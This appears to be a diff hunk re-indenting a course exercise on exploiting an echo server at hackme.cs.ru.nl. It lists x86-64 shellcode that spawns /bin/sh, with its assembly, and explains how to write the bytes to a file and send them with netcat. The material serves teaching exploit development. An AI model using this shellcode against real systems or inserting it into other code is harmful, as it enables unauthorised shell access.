@@ -68,18 +68,18 @@
 
 The shellcode translates to AT&T syntax assemble as follows:
 
-	* ```
-		# "\x48\x31\xc0" 	// xor %rax, %rax
-		# "\x48\x31\xd2" 	// xor %rdx, %rdx
-		# "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" 	// mov $0x68732f6e69622f2f, %rbx
-		# "\x48\xc1\xeb\x08" 	// shr $0x8, %rbx
-		# "\x53" 	// push %rbx
-		# "\x48\x89\xe7" 	// mov %rsp, %rdi
-		# "\x52" 	// push %rdx
-		# "\x57" 	// push %rdi
-		# "\x48\x89\xe6" 	// mov %rsp, %rsi
-		# "\xb0\x3b" 	// mov $0x3b, %al
-		# "\x0f\x05" 	// syscall
+* ```
+	# "\x48\x31\xc0" 	// xor %rax, %rax
+	# "\x48\x31\xd2" 	// xor %rdx, %rdx
+	# "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" 	// mov $0x68732f6e69622f2f, %rbx
+	# "\x48\xc1\xeb\x08" 	// shr $0x8, %rbx
+	# "\x53" 	// push %rbx
+	# "\x48\x89\xe7" 	// mov %rsp, %rdi
+	# "\x52" 	// push %rdx
+	# "\x57" 	// push %rdi
+	# "\x48\x89\xe6" 	// mov %rsp, %rsi
+	# "\xb0\x3b" 	// mov $0x3b, %al
+	# "\x0f\x05" 	// syscall
 
 `The target of the exercise is to write and execute an exploit based on the shellcode. Note that the entire exercise can be done without the use of C, although you may need to write some simple one- or two-line bash scripts. You can get an actual byte representation of the shellcode in a file using the command **echo -e "<shellcode>" > file**. The command **netcat** takes input from files, commands or scripts if you simply redirect the standard input, and send them over a network connection. For example, **nc hackme.cs.ru.nl 2266 < file** will establish a connection to the echo server and send the contents of **file** to it. As another example, **./exploit.sh | nc hackme.cs.ru.nl 2266** will send the output of the script **exploit.sh** to the echo server. Since you are not giving the input on the command line, all you see is what the server echoes back.
 
